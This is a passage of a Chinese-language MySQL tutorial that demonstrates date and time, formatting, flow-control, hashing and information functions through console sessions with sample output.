<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 时间和秒钟转换的函数</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> TIME_TO_SEC(CURTIME()),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> SEC_TO_TIME(<span class="number">83355</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span> TIME_TO_SEC(CURTIME()) <span class="operator">|</span> SEC_TO_TIME(<span class="number">83355</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+--------------------+</span></span><br><span class="line"><span class="operator">|</span>                  <span class="number">77951</span> <span class="operator">|</span> <span class="number">23</span>:<span class="number">09</span>:<span class="number">15</span>           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h3 id="（6）计算日期和时间的函数"><a href="#（6）计算日期和时间的函数" class="headerlink" title="（6）计算日期和时间的函数"></a>（6）计算日期和时间的函数</h3><p>&#x3D;&#x3D;<strong>第1组：</strong>&#x3D;&#x3D;</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140041.png" alt="  "><br><strong>上述函数中type的取值：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140043.png" alt="  "></p>
<p>&#x3D;&#x3D;<strong>第2组：</strong>&#x3D;&#x3D;</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140045.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 计算日期和时间的函数</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> NOW(),DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">YEAR</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">-1</span> <span class="keyword">YEAR</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> DATE_SUB(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">YEAR</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+---------------------------------+----------------------------------+---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> NOW()               <span class="operator">|</span> DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">YEAR</span>) <span class="operator">|</span> DATE_ADD(NOW(),<span class="type">INTERVAL</span> <span class="number">-1</span> <span class="keyword">YEAR</span>) <span class="operator">|</span> DATE_SUB(NOW(),<span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">YEAR</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+---------------------------------+----------------------------------+---------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-19</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">55</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-10</span><span class="number">-19</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">55</span>             <span class="operator">|</span> <span class="number">2021</span><span class="number">-10</span><span class="number">-19</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">55</span>              <span class="operator">|</span> <span class="number">2021</span><span class="number">-10</span><span class="number">-19</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">55</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+---------------------------------+----------------------------------+---------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">2.02</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> DATE_ADD(NOW(), <span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">DAY</span>) <span class="keyword">AS</span> col1,DATE_ADD(<span class="string">&#x27;2021-10-21 23:32:12&#x27;</span>,<span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">SECOND</span>) <span class="keyword">AS</span> col2,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ADDDATE(<span class="string">&#x27;2021-10-21 23:32:12&#x27;</span>,<span class="type">INTERVAL</span> <span class="number">1</span> <span class="keyword">SECOND</span>) <span class="keyword">AS</span> col3,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> DATE_ADD(<span class="string">&#x27;2021-10-21 23:32:12&#x27;</span>,<span class="type">INTERVAL</span> <span class="string">&#x27;1_1&#x27;</span> MINUTE_SECOND) <span class="keyword">AS</span> col4,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> DATE_ADD(NOW(), <span class="type">INTERVAL</span> <span class="number">-1</span> <span class="keyword">YEAR</span>) <span class="keyword">AS</span> col5, #可以是负数</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> DATE_ADD(NOW(), <span class="type">INTERVAL</span> <span class="string">&#x27;1_1&#x27;</span> YEAR_MONTH) <span class="keyword">AS</span> col6 #需要单引号</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> col1                <span class="operator">|</span> col2                <span class="operator">|</span> col3                <span class="operator">|</span> col4                <span class="operator">|</span> col5                <span class="operator">|</span> col6                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-20</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">57</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-10</span><span class="number">-21</span> <span class="number">23</span>:<span class="number">32</span>:<span class="number">13</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-10</span><span class="number">-21</span> <span class="number">23</span>:<span class="number">32</span>:<span class="number">13</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-10</span><span class="number">-21</span> <span class="number">23</span>:<span class="number">33</span>:<span class="number">13</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-10</span><span class="number">-19</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">57</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-11</span><span class="number">-19</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">57</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> ADDTIME(NOW(),<span class="number">20</span>),SUBTIME(NOW(),<span class="number">30</span>),SUBTIME(NOW(),<span class="string">&#x27;1:1:3&#x27;</span>),DATEDIFF(NOW(),<span class="string">&#x27;2021-10-01&#x27;</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> TIMEDIFF(NOW(),<span class="string">&#x27;2021-10-25 22:10:10&#x27;</span>),FROM_DAYS(<span class="number">366</span>),TO_DAYS(<span class="string">&#x27;0000-12-25&#x27;</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> LAST_DAY(NOW()),MAKEDATE(<span class="keyword">YEAR</span>(NOW()),<span class="number">32</span>),MAKETIME(<span class="number">10</span>,<span class="number">21</span>,<span class="number">23</span>),PERIOD_ADD(<span class="number">20200101010101</span>,<span class="number">10</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+---------------------+------------------------+------------------------------+---------------------------------------+----------------+-----------------------+-----------------+--------------------------+--------------------+-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> ADDTIME(NOW(),<span class="number">20</span>)   <span class="operator">|</span> SUBTIME(NOW(),<span class="number">30</span>)   <span class="operator">|</span> SUBTIME(NOW(),<span class="string">&#x27;1:1:3&#x27;</span>) <span class="operator">|</span> DATEDIFF(NOW(),<span class="string">&#x27;2021-10-01&#x27;</span>) <span class="operator">|</span> TIMEDIFF(NOW(),<span class="string">&#x27;2021-10-25 22:10:10&#x27;</span>) <span class="operator">|</span> FROM_DAYS(<span class="number">366</span>) <span class="operator">|</span> TO_DAYS(<span class="string">&#x27;0000-12-25&#x27;</span>) <span class="operator">|</span> LAST_DAY(NOW()) <span class="operator">|</span> MAKEDATE(<span class="keyword">YEAR</span>(NOW()),<span class="number">32</span>) <span class="operator">|</span> MAKETIME(<span class="number">10</span>,<span class="number">21</span>,<span class="number">23</span>) <span class="operator">|</span> PERIOD_ADD(<span class="number">20200101010101</span>,<span class="number">10</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+---------------------+------------------------+------------------------------+---------------------------------------+----------------+-----------------------+-----------------+--------------------------+--------------------+-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-19</span> <span class="number">21</span>:<span class="number">42</span>:<span class="number">17</span> <span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-19</span> <span class="number">21</span>:<span class="number">41</span>:<span class="number">27</span> <span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-19</span> <span class="number">20</span>:<span class="number">40</span>:<span class="number">54</span>    <span class="operator">|</span>                          <span class="number">383</span> <span class="operator">|</span> <span class="number">838</span>:<span class="number">59</span>:<span class="number">59</span>                             <span class="operator">|</span> <span class="number">0001</span><span class="number">-01</span><span class="number">-01</span>     <span class="operator">|</span>                   <span class="number">359</span> <span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-31</span>      <span class="operator">|</span> <span class="number">2022</span><span class="number">-02</span><span class="number">-01</span>               <span class="operator">|</span> <span class="number">10</span>:<span class="number">21</span>:<span class="number">23</span>           <span class="operator">|</span>                     <span class="number">869817111</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+---------------------+------------------------+------------------------------+---------------------------------------+----------------+-----------------------+-----------------+--------------------------+--------------------+-------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>




<h3 id="（7）日期的格式化与解析"><a href="#（7）日期的格式化与解析" class="headerlink" title="（7）日期的格式化与解析"></a>（7）日期的格式化与解析</h3><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140049.png" alt="  "><br>上述除了<code>GET_FORMAT</code> 函数中<code>fmt</code>参数常用的格式符：</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140050.png" alt="  "></p>
<p><code>GET_FORMAT</code>函数中<code>date_type</code>和<code>format_type</code>参数取值如下：</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140324.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 日期的格式化与解析</span><br><span class="line">mysql<span class="operator">&gt;</span> # 格式化：日期 <span class="comment">---&gt; 字符串</span></span><br><span class="line">mysql<span class="operator">&gt;</span> # 解析：  字符串 <span class="comment">----&gt; 日期</span></span><br><span class="line">mysql<span class="operator">&gt;</span> # 此时我们谈的是日期的显式格式化和解析</span><br><span class="line">mysql<span class="operator">&gt;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> # 格式化：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> DATE_FORMAT(CURDATE(),<span class="string">&#x27;%Y-%M-%D&#x27;</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> DATE_FORMAT(NOW(),<span class="string">&#x27;%Y-%m-%d&#x27;</span>),TIME_FORMAT(CURTIME(),<span class="string">&#x27;%h:%i:%S&#x27;</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> DATE_FORMAT(NOW(),<span class="string">&#x27;%Y-%M-%D %h:%i:%S %W %w %T %r&#x27;</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+-------------------------------+-----------------------------------+-------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> DATE_FORMAT(CURDATE(),<span class="string">&#x27;%Y-%M-%D&#x27;</span>) <span class="operator">|</span> DATE_FORMAT(NOW(),<span class="string">&#x27;%Y-%m-%d&#x27;</span>) <span class="operator">|</span> TIME_FORMAT(CURTIME(),<span class="string">&#x27;%h:%i:%S&#x27;</span>) <span class="operator">|</span> DATE_FORMAT(NOW(),<span class="string">&#x27;%Y-%M-%D %h:%i:%S %W %w %T %r&#x27;</span>)          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+-------------------------------+-----------------------------------+-------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2022</span><span class="operator">-</span>October<span class="number">-19</span>th                 <span class="operator">|</span> <span class="number">2022</span><span class="number">-10</span><span class="number">-19</span>                    <span class="operator">|</span> <span class="number">09</span>:<span class="number">47</span>:<span class="number">03</span>                          <span class="operator">|</span> <span class="number">2022</span><span class="operator">-</span>October<span class="number">-19</span>th <span class="number">09</span>:<span class="number">47</span>:<span class="number">03</span> Wednesday <span class="number">3</span> <span class="number">21</span>:<span class="number">47</span>:<span class="number">03</span> <span class="number">09</span>:<span class="number">47</span>:<span class="number">03</span> PM <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+-------------------------------+-----------------------------------+-------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 解析：格式化的逆过程</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> STR_TO_DATE(<span class="string">&#x27;2021-October-25th 11:37:30 Monday 1&#x27;</span>,<span class="string">&#x27;%Y-%M-%D %h:%i:%S %W %w&#x27;</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> STR_TO_DATE(<span class="string">&#x27;2021-October-25th 11:37:30 Monday 1&#x27;</span>,<span class="string">&#x27;%Y-%M-%D %h:%i:%S %W %w&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2021</span><span class="number">-10</span><span class="number">-25</span> <span class="number">11</span>:<span class="number">37</span>:<span class="number">30</span>                                                          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> GET_FORMAT(<span class="type">DATE</span>,<span class="string">&#x27;USA&#x27;</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line"><span class="operator">|</span> GET_FORMAT(<span class="type">DATE</span>,<span class="string">&#x27;USA&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">%</span>m.<span class="operator">%</span>d.<span class="operator">%</span>Y               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> DATE_FORMAT(CURDATE(),GET_FORMAT(<span class="type">DATE</span>,<span class="string">&#x27;USA&#x27;</span>))</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> DATE_FORMAT(CURDATE(),GET_FORMAT(<span class="type">DATE</span>,<span class="string">&#x27;USA&#x27;</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10.19</span><span class="number">.2022</span>                                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>



<h2 id="4-流程控制函数"><a href="#4-流程控制函数" class="headerlink" title="4. 流程控制函数"></a>4. 流程控制函数</h2><p>流程处理函数可以根据不同的条件，执行不同的处理流程，可以在SQL语句中实现不同的条件选择。MySQL中的流程处理函数主要包括<code>IF()</code>、<code>IFNULL()</code>和<code>CASE()</code>函数。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140054.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> IF(<span class="number">1</span> <span class="operator">&gt;</span> <span class="number">0</span>,<span class="string">&#x27;正确&#x27;</span>,<span class="string">&#x27;错误&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> IF(<span class="number">1</span> <span class="operator">&gt;</span> <span class="number">0</span>,<span class="string">&#x27;正确&#x27;</span>,<span class="string">&#x27;错误&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> 正确                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.30</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> IFNULL(<span class="keyword">null</span>,<span class="string">&#x27;Hello Word&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> IFNULL(<span class="keyword">null</span>,<span class="string">&#x27;Hello Word&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> Hello Word                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">CASE</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">WHEN</span> <span class="number">1</span> <span class="operator">&gt;</span> <span class="number">0</span> <span class="keyword">THEN</span> <span class="string">&#x27;hello 1&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">WHEN</span> <span class="number">2</span> <span class="operator">&gt;</span> <span class="number">0</span> <span class="keyword">THEN</span> <span class="string">&#x27;hello 2&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">ELSE</span> <span class="string">&#x27;hello 3&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> <span class="keyword">as</span> myCase;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> myCase  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> hello <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="number">1</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">WHEN</span> <span class="number">1</span> <span class="keyword">THEN</span> <span class="string">&#x27;我是1&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">WHEN</span> <span class="number">2</span> <span class="keyword">THEN</span> <span class="string">&#x27;我是2&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  <span class="keyword">ELSE</span> <span class="string">&#x27;你是谁&#x27;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> myCase;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> myCase <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> 我是<span class="number">1</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h2 id="5-加密与解密函数"><a href="#5-加密与解密函数" class="headerlink" title="5. 加密与解密函数"></a>5. 加密与解密函数</h2><p>加密与解密函数主要用于对数据库中的数据进行加密和解密处理，以防止数据被他人窃取。这些函数在保证数据库安全时非常有用。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140056.png" alt="  "><br>可以发现，ENCODE(value,password_seed)函数与DECODE(value,password_seed)函数互为反函数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 加密与解密的函数</span><br><span class="line">mysql<span class="operator">&gt;</span> # PASSWORD()在mysql8<span class="number">.0</span>中弃用。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> MD5(<span class="string">&#x27;mysql&#x27;</span>),SHA(<span class="string">&#x27;mysql&#x27;</span>),MD5(MD5(<span class="string">&#x27;mysql&#x27;</span>))</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------+------------------------------------------+----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> MD5(<span class="string">&#x27;mysql&#x27;</span>)                     <span class="operator">|</span> SHA(<span class="string">&#x27;mysql&#x27;</span>)                             <span class="operator">|</span> MD5(MD5(<span class="string">&#x27;mysql&#x27;</span>))                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------+------------------------------------------+----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">81</span>c3b080dad537de7e10e0987a4bf52e <span class="operator">|</span> f460c882a18c1304d88854e902e11b85d71e7e1b <span class="operator">|</span> <span class="number">9</span>b1c95c962f12d84f57c68e694274783 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------+------------------------------------------+----------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # ENCODE() \ DECODE() 在mysql8<span class="number">.0</span>中弃用。</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> ENCODE(<span class="string">&#x27;TYT&#x27;</span>,<span class="string">&#x27;1&#x27;</span>), DECODE(ENCODE(<span class="string">&#x27;TYT&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> ENCODE(<span class="string">&#x27;TYT&#x27;</span>,<span class="string">&#x27;1&#x27;</span>) <span class="operator">|</span> DECODE(ENCODE(<span class="string">&#x27;TYT&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),<span class="string">&#x27;1&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> 肰               <span class="operator">|</span> TYT                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+-------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">3</span> warnings (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<h2 id="6-MySQL信息函数"><a href="#6-MySQL信息函数" class="headerlink" title="6. MySQL信息函数"></a>6. MySQL信息函数</h2><p>MySQL中内置了一些可以查询MySQL信息的函数，这些函数主要用于帮助数据库开发或运维人员更好地对数据库进行维护工作。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140058.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # MySQL信息函数</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> VERSION(),CONNECTION_ID(),DATABASE(),SCHEMA(),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">USER</span>(),<span class="built_in">CURRENT_USER</span>(),CHARSET(<span class="string">&#x27;划水艺术家&#x27;</span>),<span class="keyword">COLLATION</span>(<span class="string">&#x27;划水艺术家&#x27;</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------------+------------+----------+--------+-----------------------------------+-----------------------+-------------------------+</span></span><br><span class="line"><span class="operator">|</span> VERSION()  <span class="operator">|</span> CONNECTION_ID() <span class="operator">|</span> DATABASE() <span class="operator">|</span> SCHEMA() <span class="operator">|</span> <span class="keyword">USER</span>() <span class="operator">|</span> <span class="built_in">CURRENT_USER</span>()                    <span class="operator">|</span> CHARSET(<span class="string">&#x27;划水艺术家&#x27;</span>) <span class="operator">|</span> <span class="keyword">COLLATION</span>(<span class="string">&#x27;划水艺术家&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------------+------------+----------+--------+-----------------------------------+-----------------------+-------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5.7</span><span class="number">.36</span><span class="operator">-</span>log <span class="operator">|</span>              <span class="number">14</span> <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> rooot@ <span class="operator">|</span> <span class="keyword">skip</span><span class="operator">-</span>grants <span class="keyword">user</span><span class="variable">@skip</span><span class="operator">-</span>grants host <span class="operator">|</span> gbk                   <span class="operator">|</span> gbk_chinese_ci          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-----------------+------------+----------+--------+-----------------------------------+-----------------------+-------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<h2 id="7-其他函数"><a href="#7-其他函数" class="headerlink" title="7. 其他函数"></a>7. 其他函数</h2><p>MySQL中有些函数无法对其进行具体的分类，但是这些函数在MySQL的开发和运维过程中也是不容忽视的。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140100.png" alt="  "></p>
